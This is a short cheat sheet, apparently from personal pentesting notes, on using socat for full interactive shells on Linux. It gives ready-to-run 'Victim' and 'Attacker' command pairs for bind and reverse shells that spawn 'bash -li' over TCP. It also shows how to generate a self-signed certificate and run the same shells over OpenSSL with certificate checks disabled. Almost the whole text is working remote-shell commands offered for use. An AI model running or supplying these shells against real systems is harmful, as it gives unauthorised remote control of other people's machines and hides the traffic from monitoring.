# Introduction
A great tool for having full interactive reverse and bind shells. I am assuming that we are using socat on Linux and not Windows.

## Installation on Ubuntu
```bash
sudo apt update && sudo apt install socat -y
```
## Usage
### Bind shell
We must first listen on the victim's machine.

Victim
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:4444
```

And now we connect as an attacker to the victim's machine.

Attacker
```bash
socat file:`tty`,raw,echo=0 tcp:192.168.92.134:4444
```

> [!WARNING]
> 192.168.92.134 is the IP of the victim, make sure to change the IP to the one you want.
### Reverse shell
We must first listen on the attacker's machine.

Attacker
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

And now the victim's machine connects to the attacker.

Victim
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.92.129:4444
```

> [!WARNING]
> 192.168.92.129 is the IP of the attacker, make sure to change the IP to the one you want.

### Encrypted Shells
Replace `tcp` with `openssl`
Generate certificate
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Combine into PEM file
```bash
cat shell.key shell.crt > shell.pem
```
#### Reverse shell
Set up our reverse shell listener
Attacker
```bash
socat file:`tty`,raw,echo=0 openssl-listen:4444,cert=shell.pem,verify=0
```
Certificate _must_ be used on whichever device is listening
`verify=0`  not bother trying to validate that our certificate has been properly signed by a recognized authority
To connect back
Victim
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl:192.168.92.129:4444,verify=0
```
#### Bind shell
Victim
```bash
socat openssl-listen:4444,cert=shell.pem,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
Attacker
```bash
socat file:`tty`,raw,echo=0 openssl:192.168.92.134:4444,verify=0
```